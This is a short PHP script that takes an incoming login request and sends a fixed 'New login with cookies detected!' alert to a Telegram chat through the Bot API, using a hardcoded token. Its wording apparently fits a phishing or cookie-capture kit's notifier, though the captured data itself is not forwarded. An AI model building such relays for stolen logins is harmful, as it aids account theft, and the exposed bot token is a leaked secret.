<?php
// Bot token provided by you
$botToken = "7658090962:AAEqucXmobDAABRg8SvuyVHpM_rOIK4_Qus";

// Use the chat ID you provided
$chatId = "7658090962";  // This is your chat ID

// Get the incoming login message from the request
$data = json_decode(file_get_contents("php://input"));
$message = "New login with cookies detected!"; // Customize this message if needed

// Build the Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Send the request to the Telegram API
$response = file_get_contents($url);

// Return a response to the client
echo json_encode(['status' => 'success', 'message' => 'Notification sent']);
?>